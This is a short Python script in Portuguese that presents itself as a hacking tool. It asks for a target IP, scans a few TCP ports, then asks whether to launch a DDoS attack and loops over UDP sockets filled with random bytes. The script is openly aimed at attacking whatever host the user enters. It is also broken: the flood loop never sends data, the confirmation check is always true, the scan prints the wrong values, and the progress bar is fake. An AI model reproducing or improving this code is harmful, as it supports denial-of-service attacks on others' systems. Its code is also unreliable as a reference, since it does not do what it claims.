import socket
import random
import os
import time

os.system('clear')
time.sleep(1)
os.system('figlet Hacking')
time.sleep(1)
os.system('figlet Euliveira')
time.sleep(3)

print("""
••••••••••••••••••••••••••••••••••••••••••••••
      DESENVOLVEDOR: WILLIAN DE OLIVEIRA
             HACKING NAO EH CRIME
•••••••••••••••••••••••••••••••••••••••••••••""")
time.sleep(1)
IP = input('Digite o IP: ')
print('IP digitado: ', IP)
ports = [21,22,80,144,8080]

time.sleep(1)
print('Conectando...')
time.sleep(1)
print(""" 20% ••""")
time.sleep(1)
print(""" 40% ••••""")
time.sleep(1)
print(""" 60% ••••••""")
time.sleep(1)
print(""" 80% ••••••••""")
time.sleep(1)
print(""" 100% ••••••••••""")
time.sleep(1)
print(""" Pronto para uso""")
time.sleep(2)

print('Conexao bem sucedida')
time.sleep(1)
print('Varredura de portas')
time.sleep(2)
for port in ports:
          client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          client.settimeout(0.1)
          code = client.connect_ex((IP, port))
          if code == 0:
                  print(ports,'Porta aberta')
          else:
                  print(ports,'Porta fechada')

time.sleep(3)
os.system('figlet Ataque')

print('IP digitado: ', IP)
time.sleep(1)
print('Portas selecionadas: ', ports)
time.sleep(3)

Question = input('Deseja fazer um ataque DDoS? ')
if 'response' == 'y' or '1':
    print('Iniciando ataque DDoS')
else:
      print('O ataque foi cancelado')
time.sleep(2)

for x in range(10000):
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      bytes = random._urandom(10000)
      print('Ataque ao IP', IP)
      print(ports)
      
